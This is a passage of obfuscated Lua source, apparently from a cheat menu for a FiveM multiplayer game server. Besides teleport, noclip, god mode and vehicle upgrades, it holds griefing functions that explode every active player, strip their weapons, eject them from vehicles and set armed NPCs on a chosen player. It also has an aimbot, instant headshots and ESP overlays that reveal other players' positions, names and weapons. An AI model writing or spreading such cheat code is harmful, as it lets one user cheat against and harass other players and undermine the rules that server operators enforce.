			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = GetPlayerPed(-1)
		end;
		if entity then
			SetEntityCoords(entity, el + 0.5, em + 0.5, en + 0.5, 1, 0, 0, 1)
		end
	end
end;
local function es()
	local el = 428.61;
	local em = -799.89;
	local en = 29.49;
	if el ~= "" and em ~= "" and en ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = GetPlayerPed(-1)
		end;
		if entity then
			SetEntityCoords(entity, el + 0.5, em + 0.5, en + 0.5, 1, 0, 0, 1)
		end
	end
end;
local function et()
	local el = -32.84;
	local em = -152.34;
	local en = 57.08;
	if el ~= "" and em ~= "" and en ~= "" then
		if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
			entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
		else
			entity = GetPlayerPed(-1)
		end;
		if entity then
			SetEntityCoords(entity, el + 0.5, em + 0.5, en + 0.5, 1, 0, 0, 1)
		end
	end
end;
function MaxOut(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
	SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
	SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
	SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end;
function engine(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
	SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
end;
function engine1(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
	SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
	SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
	SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end;
local function eu()
	ShowInfo("~g~Car fixed!")
	SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
	SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
	SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
	Citizen.InvokeNative(2292506429516893400, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
end;
local function ev(veh)
	SetVehicleEngineHealth(veh, 1000)
	SetVehicleFixed(veh)
end;
local function ew(by)
	local ped = GetPlayerPed(by)
	local bs = GetEntityCoords(ped)
	AddExplosion(bs.x + 1, bs.y + 1, bs.z + 1, 4, 100.0, true, false, 0.0)
end;
local function ex(self)
	local ey = GetActivePlayers()
	for i = 0, #ey do
		if not self and i == PlayerId() then
			i = i + 1
		end;
		ew(i)
	end
end;
local function ez(by, eA)
	local bs = GetEntityCoords(GetPlayerPed(by))
	if eA == 1 then
		weparray = bT
	elseif eA == 2 then
		weparray = bU
	elseif eA == 3 then
		weparray = bW
	elseif eA == 4 then
		weparray = c0
	end;
	for cP in EnumeratePeds() do
		if cP ~= GetPlayerPed(by) and not IsPedAPlayer(cP) and GetDistanceBetweenCoords(bs, GetEntityCoords(cP)) < 2000 then
			local eB = math.ceil(math.random(#weparray))
			if weparray ~= bT then
				GiveWeaponToPed(cP, GetHashKey(weparray[eB][1]), 9999, 0, 1)
			else
				GiveWeaponToPed(cP, GetHashKey(weparray[eB]), 9999, 0, 1)
			end;
			ClearPedTasks(cP)
			TaskCombatPed(cP, GetPlayerPed(by), 0, 16)
			SetPedCombatAbility(cP, 100)
			SetPedCombatRange(cP, 2)
			SetPedCombatAttributes(cP, 46, 1)
			SetPedCombatAttributes(cP, 5, 1)
		end
	end
end;
function ApplyShockwave(entity)
	local pos = GetEntityCoords(PlayerPedId())
	local eC = GetEntityCoords(entity)
	local eD = eC.x - pos.x;
	local eE = eC.y - pos.y;
	local eF = eC.z - pos.z;
	local distance = math.sqrt(eD * eD + eE * eE + eF * eF)
	local eG = 50 / distance * math.pow(1.04, 1 - distance)
	ApplyForceToEntity(entity, 1, eG * eD, eG * eE, eG * eF, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
end;
local function eH(eI)
	local ea = PlayerPedId()
	local bs = GetEntityCoords(PlayerPedId())
	local eJ = GetPlayersLastVehicle()
	local eK = IsPedInVehicle(ea, eJ, true)
	DrawMarker(28, bs.x, bs.y, bs.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, eI, eI, eI, 180, 80, 0, 35, false, true, 2, nil, nil, false)
	for cP in EnumerateVehicles() do
		if (not eK or cP ~= eJ) and GetDistanceBetweenCoords(bs, GetEntityCoords(cP)) <= eI * 1.2 then
			RequestControlOnce(cP)
			ApplyShockwave(cP)
		end
	end;
	for cP in EnumeratePeds() do
		if cP ~= PlayerPedId() and GetDistanceBetweenCoords(bs, GetEntityCoords(cP)) <= eI * 1.2 then
			RequestControlOnce(cP)
			SetPedRagdollOnCollision(cP, true)
			SetPedRagdollForceFall(cP)
			ApplyShockwave(cP)
		end
	end
end;
local function eL()
	DisablePlayerFiring(PlayerPedId(), true)
	if IsDisabledControlPressed(0, cn["MOUSE1"]) then
		local av, eM = GetCurrentPedWeapon(PlayerPedId())
		local eN = GetCurrentPedWeaponEntityIndex(PlayerPedId())
		local eO = GetCamDirFromScreenCenter()
		local cX = GetGameplayCamCoord()
		local eP = GetEntityCoords(eN)
		local dq = cX + eO * 200.0;
		ClearAreaOfProjectiles(eP, 0.0, 1)
		ShootSingleBulletBetweenCoords(eP, dq, 5, 1, eM, PlayerPedId(), true, true, 24000.0)
		ShootSingleBulletBetweenCoords(eP, dq, 5, 1, eM, PlayerPedId(), true, true, 24000.0)
	end
end;
local function eQ(by)
	local ped = GetPlayerPed(by)
	RemoveAllPedWeapons(ped, false)
end;
local function eR(self)
	local ey = GetActivePlayers()
	for i = 0, #ey do
		if not self and i == PlayerId() then
			i = i + 1
		end;
		eQ(i)
	end
end;
local function eS(by)
	local ped = GetPlayerPed(by)
	if IsPedInAnyVehicle(ped, false) then
		ClearPedTasksImmediately(ped)
	end
end;
local function eT(self)
	local ey = GetActivePlayers()
	for i = 0, #ey do
		if not self and i == PlayerId() then
			i = i + 1
		end;
		eS(i)
	end
end;
local function eU(self)
	local ey = GetActivePlayers()
	for i = 0, #ey do
		if not self and i == PlayerId() then
			i = i + 1
		end;
		ClearPedTasksImmediately(GetPlayerPed(ey[i]))
	end
end;
local function eV(by)
	local ped = GetPlayerPed(by)
	SetPedRandomComponentVariation(ped, false)
	SetPedRandomProps(ped)
end;
local function eW(by)
	local ped = GetPlayerPed(by)
	for i = 0, #bT do
		GiveWeaponToPed(ped, GetHashKey(bT[i]), 9999, false, false)
	end
end;
local function eX(self)
	local ey = GetActivePlayers()
	for i = 0, #ey do
		if not self and i == PlayerId() then
			i = i + 1
		end;
		eW(i)
	end
end;
local function eY(by, eM)
	local ped = GetPlayerPed(by)
	GiveWeaponToPed(ped, GetHashKey(eM), 9999, false, false)
end;
local function eZ(by)
	local ped = GetPlayerPed(by)
	for i = 1, #bT do
		AddAmmoToPed(ped, GetHashKey(bT[i]), 9999)
	end
end;
local function e_(by)
	local ped = GetPlayerPed(by)
	local pos = GetEntityCoords(ped)
	SetEntityCoords(PlayerPedId(), pos)
end;
local function f0()
	local entity = PlayerPedId()
	if IsPedInAnyVehicle(entity, false) then
		entity = GetVehiclePedIsUsing(entity)
	end;
	local f1 = false;
	local f2 = false;
	local bB = GetBlipInfoIdIterator()
	local bC = GetFirstBlipInfoId(8)
	while DoesBlipExist(bC) do
		if GetBlipInfoIdType(bC) == 4 then
			cx, cy, cz = table.unpack(Citizen.InvokeNative(18049441090438849000, bC, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))
			f2 = true;
			break
		end;
		bC = GetNextBlipInfoId(bB)
		Wait(0)
	end;
	if f2 then
		local f3 = false;
		local f4 = GetEntityHeading(entity)
		for i = 0, 1000, 1 do
			SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
			SetEntityRotation(entity, 0, 0, 0, 0, 0)
			SetEntityHeading(entity, f4)
			SetGameplayCamRelativeHeading(0)
			Wait(0)
			if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
				cz = ToFloat(i)
				f3 = true;
				break
			end
		end;
		if not f3 then
			cz = -300.0
		end;
		f1 = true
	else
		ShowInfo("~r~Blip not found")
	end;
	if f1 then
		ShowInfo("~g~Teleported!")
		SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
		SetGameplayCamRelativeHeading(0)
		if IsPedSittingInAnyVehicle(PlayerPedId()) then
			if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
				SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
			end
		end
	end
end;
local function f5(f6)
	local ped = PlayerPedId()
	SetEntityProofs(ped, f6, f6, f6, f6, f6)
	SetPedCanRagdoll(ped, not f6)
end;
local function f7()
	ShowInfo("Noclipping ~g~[ON]")
	Noclipping = not Noclipping;
	if Noclipping then
		SetEntityVisible(PlayerPedId(), false, false)
	else
		SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
		SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
		SetEntityVisible(PlayerPedId(), true, false)
	end
end;
local function f8()
	ESPEnabled = not ESPEnabled;
	local av, x, y = false, 0.0, 0.0;
	Citizen.CreateThread(function()
		while ESPEnabled do
			local ey = GetActivePlayers()
			table.removekey(ey, PlayerId())
			for i = 1, #ey do
				local bz = GetEntityCoords(GetPlayerPed(ey[i]))
				av, x, y = GetScreenCoordFromWorldCoord(bz.x, bz.y, bz.z)
			end;
			Wait(ESPRefreshTime)
		end
	end)
	Citizen.CreateThread(function()
		while ESPEnabled do
			local ey = GetActivePlayers()
			table.removekey(ey, PlayerId())
			for i = 1, #ey do
				local bz = GetEntityCoords(GetPlayerPed(ey[i]))
				local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), bz)
				if distance <= EspDistance then
					local av, f9 = GetCurrentPedWeapon(GetPlayerPed(ey[i]), 1)
					local fa = GetWeaponNameFromHash(f9)
					local fb = "On Foot"
					if IsPedInAnyVehicle(GetPlayerPed(ey[i]), 0) then
						fb = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(ey[i])))))
					end;
					if fa == nil then
						fa = "Unknown"
					end;
					DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
					DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
					local fc = "~b~ID: " .. GetPlayerServerId(ey[i]) .. "  |  ~b~Name: " .. GetPlayerName(ey[i]) .. "  |  ~b~Distance: " .. math.floor(distance)
					local fd = "~b~Weapon: " .. fa .. "  |  ~b~Vehicle: " .. fb;
					DrawTxt(fc, x - 0.05, y - 0.04, 0.0, 0.2)
					DrawTxt(fd, x - 0.05, y - 0.03, 0.0, 0.2)
				end
			end;
			Wait(0)
		end
	end)
end;
function ToggleBlips()
	BlipsEnabled = not BlipsEnabled;
	if not BlipsEnabled then
		for i = 1, #pblips do
			RemoveBlip(pblips[i])
		end
	else
		Citizen.CreateThread(function()
			pblips = {}
			while BlipsEnabled do
				local ey = GetActivePlayers()
				table.removekey(ey, PlayerId())
				for i = 1, #ey do
					if NetworkIsPlayerActive(ey[i]) then
						ped = GetPlayerPed(ey[i])
						pblips[i] = GetBlipFromEntity(ped)
						if not DoesBlipExist(pblips[i]) then
							pblips[i] = AddBlipForEntity(ped)
							SetBlipSprite(pblips[i], 1)
							Citizen.InvokeNative(6898569612438869000, pblips[i], true)
						else
							veh = GetVehiclePedIsIn(ped, false)
							blipSprite = GetBlipSprite(pblips[i])
							if not GetEntityHealth(ped) then
								if blipSprite ~= 274 then
									SetBlipSprite(pblips[i], 274)
									Citizen.InvokeNative(6898569612438869000, pblips[i], false)
								end
							elseif veh then
								vehClass = GetVehicleClass(veh)
								vehModel = GetEntityModel(veh)
								if vehClass == 15 then
									if blipSprite ~= 422 then
										SetBlipSprite(pblips[i], 422)
										Citizen.InvokeNative(6898569612438869000, pblips[i], false)
									end
								elseif vehClass == 16 then
									if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
										if blipSprite ~= 424 then
											SetBlipSprite(pblips[i], 424)
											Citizen.InvokeNative(6898569612438869000, pblips[i], false)
										end
									elseif blipSprite ~= 423 then
										SetBlipSprite(pblips[i], 423)
										Citizen.InvokeNative(6898569612438869000, pblips[i], false)
									end
								elseif vehClass == 14 then
									if blipSprite ~= 427 then
										SetBlipSprite(pblips[i], 427)
										Citizen.InvokeNative(6898569612438869000, pblips[i], false)
									end
								elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("limo2") then
									if blipSprite ~= 426 then
										SetBlipSprite(pblips[i], 426)
										Citizen.InvokeNative(6898569612438869000, pblips[i], false)
									end
								elseif vehModel == GetHashKey("rhino") then
									if blipSprite ~= 421 then
										SetBlipSprite(pblips[i], 421)
										Citizen.InvokeNative(6898569612438869000, pblips[i], false)
									end
								elseif blipSprite ~= 1 then
									SetBlipSprite(pblips[i], 1)
									Citizen.InvokeNative(6898569612438869000, pblips[i], true)
								end;
								passengers = GetVehicleNumberOfPassengers(veh)
								if passengers then
									if not IsVehicleSeatFree(veh, -1) then
										passengers = passengers + 1
									end;
									ShowNumberOnBlip(pblips[i], passengers)
								else
									HideNumberOnBlip(pblips[i])
								end
							else
								HideNumberOnBlip(pblips[i])
								if blipSprite ~= 1 then
									SetBlipSprite(pblips[i], 1)
									Citizen.InvokeNative(6898569612438869000, pblips[i], true)
								end
							end;
							SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
							SetBlipNameToPlayerName(pblips[i], ey[i])
							SetBlipScale(pblips[i], 0.85)
							if IsPauseMenuActive() then
								SetBlipAlpha(pblips[i], 255)
							else
								x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
								x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(ey[i]), true))
								distance = math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) + 900;
								if distance < 0 then
									distance = 0
								elseif distance > 255 then
									distance = 255
								end;
								SetBlipAlpha(pblips[i], distance)
							end
						end
					end
				end;
				Wait(0)
			end
		end)
	end
end;
local function fe(by, ff)
	local fg = GetPedBoneCoords(by, GetEntityBoneIndexByName(by, ff), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), fg, true)
end;
local function fh(by, ff, fi)
	local fg = GetPedBoneCoords(by, GetEntityBoneIndexByName(by, ff), 0.0, 0.0, 0.0)
	local av, eM = GetCurrentPedWeapon(PlayerPedId())
	ShootSingleBulletBetweenCoords(AddVectors(fg, vector3(0, 0, 0.1)), fg, fi, true, eM, PlayerPedId(), true, true, 1000.0)
end;
local function fj(cP)
	if IsEntityOnScreen(cP) and HasEntityClearLosToEntityInFront(PlayerPedId(), cP) and not IsPedDeadOrDying(cP) and not IsPedInVehicle(cP, GetVehiclePedIsIn(cP), false) and IsDisabledControlPressed(0, cn["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
		local x, y, z = table.unpack(GetEntityCoords(cP))
		local av, dv, dw = World3dToScreen2d(x, y, z)
		if dv > 0.25 and dv < 0.75 and dw > 0.25 and dw < 0.75 then
			local av, eM = GetCurrentPedWeapon(PlayerPedId())
			fh(cP, AimbotBone, GetWeaponDamage(eM, 1))
		end
	end
end;
local function fk(by)
	if not IsPedDeadOrDying(by) then
		local fg = GetPedBoneCoords(by, GetEntityBoneIndexByName(by, "SKEL_HEAD"), 0.0, 0.0, 0.0)
		local av, eM = GetCurrentPedWeapon(PlayerPedId())
		ShootSingleBulletBetweenCoords(AddVectors(fg, vector3(0, 0, 0.1)), fg, 9999, true, eM, PlayerPedId(), false, false, 1000.0)
		ShootSingleBulletBetweenCoords(AddVectors(fg, vector3(0, 0.1, 0)), fg, 9999, true, eM, PlayerPedId(), false, false, 1000.0)
		ShootSingleBulletBetweenCoords(AddVectors(fg, vector3(0.1, 0, 0)), fg, 9999, true, eM, PlayerPedId(), false, false, 1000.0)
	end
end;
local function fl(aM)
	if aM == "Head" then
		return "SKEL_Head"
	elseif aM == "Chest" then
		return "SKEL_Spine2"
	elseif aM == "Left Arm" then
		return "SKEL_L_UpperArm"
	elseif aM == "Right Arm" then
		return "SKEL_R_UpperArm"
	elseif aM == "Left Leg" then
		return "SKEL_L_Thigh"
	elseif aM == "Right Leg" then
		return "SKEL_R_Thigh"
	elseif aM == "Dick" then
		return "SKEL_Pelvis"
	else
		return "SKEL_ROOT"
	end
end;
local function fm(fn, fo, fp)
	RequestModel(GetHashKey(fn))
	Wait(500)
	if HasModelLoaded(GetHashKey(fn)) then
		local bs = GetEntityCoords(PlayerPedId())
		local fq = GetEntityForwardX(PlayerPedId())
		local fr = GetEntityForwardY(PlayerPedId())
		local a2 = GetEntityHeading(PlayerPedId())
		local veh = CreateVehicle(GetHashKey(fn), bs.x + fq * 5, bs.y + fr * 5, bs.z, a2, 1, 1)
		if fo then
			SetPedIntoVehicle(PlayerPedId(), veh, -1)
		end;
		if fp then
			SetVehicleEngineOn(veh, 1, 1)
		end;
		return veh
	else
		ShowInfo("~r~Model not recognized (Try Again)")
	end
end;
local function fs(fn, fo, ft)
	RequestModel(GetHashKey(fn))
	Wait(500)
	if HasModelLoaded(GetHashKey(fn)) then
		local bs = GetEntityCoords(PlayerPedId())
		local fq = GetEntityForwardX(PlayerPedId())
		local fr = GetEntityForwardY(PlayerPedId())
		local a2 = GetEntityHeading(PlayerPedId())
		local veh = nil;
		if ft then
